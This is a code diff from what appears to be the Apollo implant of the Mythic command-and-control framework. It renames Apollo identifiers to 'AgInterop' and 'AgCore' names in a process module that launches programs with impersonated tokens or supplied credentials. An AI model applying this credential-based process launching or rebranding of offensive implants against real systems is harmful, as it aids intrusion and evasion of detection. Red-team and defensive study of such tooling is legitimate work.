@@ -1,10 +1,10 @@
 //#define SERVER2012_COMPATIBLE
 
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Classes.Impersonation;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
+using AgInterop.Classes.Api;
+using AgInterop.Classes.Events;
+using AgInterop.Classes.Impersonation;
+using AgInterop.Interfaces;
+using AgInterop.Structs.AgCoreStructs;
 using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
@@ -14,13 +14,13 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
-using ApolloInterop.Features.WindowsTypesAndAPIs;
-using ApolloInterop.Structs;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Utils;
-using static ApolloInterop.Enums.Win32;
-using static ApolloInterop.Structs.Win32;
-using AI = ApolloInterop.Classes.Core;
+using AgInterop.Features.WindowsTypesAndAPIs;
+using AgInterop.Structs;
+using AgInterop.Structs.MythicStructs;
+using AgInterop.Utils;
+using static AgInterop.Enums.Win32;
+using static AgInterop.Structs.Win32;
+using AI = AgInterop.Classes.Core;
 
 namespace Process
 {
@@ -717,7 +717,7 @@ namespace Process
             });
         }
 
-        public override bool StartWithCredentials(ApolloLogonInformation logonInfo)
+        public override bool StartWithCredentials(AgCoreLogonInformation logonInfo)
         {
             bool bRet = false;
             IntPtr hToken = IntPtr.Zero;
@@ -748,21 +748,21 @@ namespace Process
             return StartWithCredentials(hToken, GetCurrentLogonInformation());
         }
 
-        private ApolloLogonInformation? GetCurrentLogonInformation()
+        private AgCoreLogonInformation? GetCurrentLogonInformation()
         {
-            return _agent.GetIdentityManager().GetCurrentLogonInformation(out ApolloLogonInformation logonInfo)
+            return _agent.GetIdentityManager().GetCurrentLogonInformation(out AgCoreLogonInformation logonInfo)
                 ? logonInfo
-                : (ApolloLogonInformation?)null;
+                : (AgCoreLogonInformation?)null;
         }
 
-        private static LogonFlags GetCredentialLogonFlags(ApolloLogonInformation? logonInfo)
+        private static LogonFlags GetCredentialLogonFlags(AgCoreLogonInformation? logonInfo)
         {
             return logonInfo?.NetOnly == true
                 ? LogonFlags.LOGON_NETCREDENTIALS_ONLY
                 : LogonFlags.NONE;
         }
 
-        private bool StartWithCredentials(IntPtr hToken, ApolloLogonInformation? logonInfo)
+        private bool StartWithCredentials(IntPtr hToken, AgCoreLogonInformation? logonInfo)
         {
             int dwError;
             var bRet = false;
@@ -827,7 +827,7 @@ namespace Process
                     {
                         if (logonInfo.HasValue)
                         {
-                            ApolloLogonInformation cred = logonInfo.Value;
+                            AgCoreLogonInformation cred = logonInfo.Value;
                             DebugHelp.DebugWriteLine("Failed to create process with token. Attempting to create process with logon.");
                             bRet = _pCreateProcessWithLogonW(
                                 cred.Username,
